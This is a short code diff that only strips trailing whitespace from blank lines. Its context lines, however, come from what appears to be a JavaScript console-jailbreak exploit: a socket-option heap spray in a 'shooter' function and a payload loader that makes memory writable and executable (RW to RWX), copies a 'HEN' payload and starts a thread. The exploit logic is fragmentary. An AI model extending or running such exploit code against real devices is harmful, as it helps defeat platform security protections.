@@ -470,7 +470,7 @@ function shooter(gad) {
 
     const hh = host();
     const stub = stubFor(S.setsockopt);
-    
+
     if (STATE.batch === undefined && hh.prepareMany && stub) {
       STATE.batch = 0;
       for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
@@ -1904,7 +1904,7 @@ async function loadPayload(url, vorab, defused) {
       ", errno " + c.errno());
     return rv === 0;
   };
-  
+
   for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
   say("[p] payload mapping is writable; copying final code before execution");
 
@@ -1931,7 +1931,7 @@ async function loadPayload(url, vorab, defused) {
     return false;
   }
   say("[p] final payload mapping committed RW -> RWX");
-  
+
   say("[p] corrected HEN copied byte-for-byte and verified, starting thread");
 
   const fn = STATE.pthread;
